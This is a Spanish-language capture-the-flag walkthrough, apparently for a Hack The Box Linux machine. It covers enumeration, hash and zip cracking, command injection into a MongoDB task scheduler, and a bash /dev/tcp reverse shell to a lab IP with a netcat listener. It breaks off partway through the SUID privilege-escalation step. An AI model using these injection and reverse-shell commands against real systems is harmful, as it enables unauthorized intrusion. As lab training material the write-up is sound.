Esta maquina es dificil en un punto final que no terminamos de escribir
## Summary

- IP -> 10.10.10.58
- Ports -> TCP (22, 3000), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 -> Xenial
    - 3000 -> Apache Hadoop


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL:PORT>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Comando -> **searchsploit ssh user enumeration** Buscamos vulnerabilidades, si encontramos con .py mucho mejor, tenemos que encontrar con la version de ssh 7.2 en python2
- Comando -> **python2 ssh_enum.py 10.10.10.58 root 2>/dev/null** Nos dira si ese usuario es valido en la maquina victima y hacemos que los errores no aparezcan 

- Comando -> **wfuzz -c --hc=404 --hh=3861  -t 200 -w < RUTA DICCIONARIO> < http:// URL:PORT/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
	- **/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
Al no encontrar nada, nos vamos a analizar las peticiones en la pagina web en el Inspector -> Network.

Encontramos una ruta en donde podemos ver que exitsen usuarios y hashes **/api/users**
Esos hashes los podemos crackear en la pagina **crackstation.net** checar con john the ripper.
 Primero probamos en el ssh 
	 - Comando -> **sshpass -p <'PASSWORD'> ssh < USER>@< IP>** Conectarnos por ssh   
Despues en el login de la pagina web.

Una vez adentro de la pagina web nos descargamos el archivo baskup
- Comando -> **file myplace.backup** Nos dice que tipo de archivo es por los magic numbers (List file of signatures) y es un ASCII text
- Comando -> **cat myplace.backup** Observamos el contenio y miramos que es base64
- Comando -> **cat myplace.backup | base64 -d | sponge myplace.backup** Decodificamos el archivo y lo metemos en el mismo con sponge lo que nos resulte de la decodificacion
- Comando -> **file myplace.backup** Nos dice que tipo de archivo es por los magic numbers y ahora es un zip
- Comando -> **mv myplace.backup myplace.zip** Le cambiamos el nombre con terminacion .zip para que sea mas comodo
- Comando -> **unzip myplace.zip** Para hacerle el unzip, pero tiene passwd 
- Comando -> **7z l myplace.zip** (l=ele) Podemos ver el contenido interno del archivo zip

- Comando -> **zip2john myplace.zip > hash** Le pasamos el contenido de un archivo zip con passwd y nos regresara un hash que lo colocaremos en un archivo llamado hash
- Comando -> **john --wordlist=</usr/share/wordlists/rockyou.txt> < HASHFILE>** Aplicamos un ataque de fuerza bruta a un archivo hash (raw-md5, sha256) para que nos devuelva la passwd 'magicword' y asi poder abrir el archivo zip anterior

Nos movemos a la siguiente ruta: **/var/www/myplace/** y miramos el archivo app.js

Y obtenemos una passwd la cual podemos usar para podernos conectar por ssh 
- Comando -> **sshpass -p <'PASSWORD'> ssh < USER>@< IP>** Conectarnos por ssh  con el usuario Mark 

- Comando -> **lsb_release -a**  Para ver alguna descripcion del Ubuntu 
- Comando -> **id**
- Comando -> **sudo -l**

- Comando -> **find / -perm -4000 -user root 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root
	Ahi encontramos un archivo **/usr/local/bin/backup** el cual nos puede ayudar a elevar los privilegios
- Comando -> **la -l /usr/local/bin/backup** Podemos ver los privilegios y lo creo el usuario root y pertenece al grupo admin 
- Comando -> **la -l /home/** Podemos ver los usuarios que tiene home y encontramos 3 (Tom, Mark y Frank)
- Comando -> **groups tom** Miramos a que grupo pertenece cada usuario y nos damos cuenta que Tom pertenece al grupo admin, ademas de que ahi tambien se encuentra la flag de user.txt

Recordemos que esta por detras MongoDB
- Comando -> **ps -faux** Listar procesos en Linux
- Comando -> **mongo -u mark -p j4hb54j3b53kj scheduler** Nos conectaremos a mongo DB a la parte de scheduler, si nos sale un error como el siguiente: 'Failed global initialization' colocamos el siguiente comando **export LC_ALL=C**
	- **>show colletions** 
	- **>db.tasks.find()** Mirar si hay algun comando 
	- **>db.task.insert({"cmd": "touch /tmp/example"})** Para insertar un comando 
- Comando -> **ls -l /tmp** Podemos ver el archivo creado por el comando que habiamos ejecutado anteriormente y este lo hara en este caso por el usuario Tom

Ahora que ya tenemos una via potencial, podemos meter una revershell
- Comando -> **mongo -u mark -p j4hb54j3b53kj scheduler** Nos conectaremos a mongo DB a la parte de scheduler
	-  **>db.task.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.17/443 0>&1'"})** Para insertar un comando que sera una revershell
- Comando -> **nc -nlcp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux 
Ahora somos el usuario Tom, hacemos tratamiento de la consola y buscamos la flag user.txt

## Root
- Comando -> **find / -perm -4000 -user root 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root
	Ahi encontramos un archivo **/usr/local/bin/backup** el cual nos puede ayudar a elevar los privilegios
- Comando -> **la -l /usr/local/bin/backup** Podemos ver los privilegios y lo creo el usuario root y pertenece al grupo admin 
- Comando -> **la -l /home/** Podemos ver los usuarios que tiene home y encontramos 3 (Tom, Mark y Frank)
- Comando -> **groups tom** Miramos a que grupo pertenece cada usuario y nos damos cuenta que Tom pertenece al grupo admin, ademas de que ahi tambien se encuentra la flag de user.txt La diferencia, es que ahora somos Tom
- Comando -> **id** Identificador de los usuarios (UID), root=UID=0

- Comando -> **ltrace o strace** Te permiten ver que es lo que pasa cuando se ejecuta un comando 
- Comando -> **ltrace backup** Miramos que pasa cuando ejecutamos el backup
- Comando -> **strace backup** Miramos que pasa cuando ejecutamos el backup con mas detalle

Empezamos a agregar valores por lo que serian 3 tipos de valores diferentes para poder hacer funcionar el File. 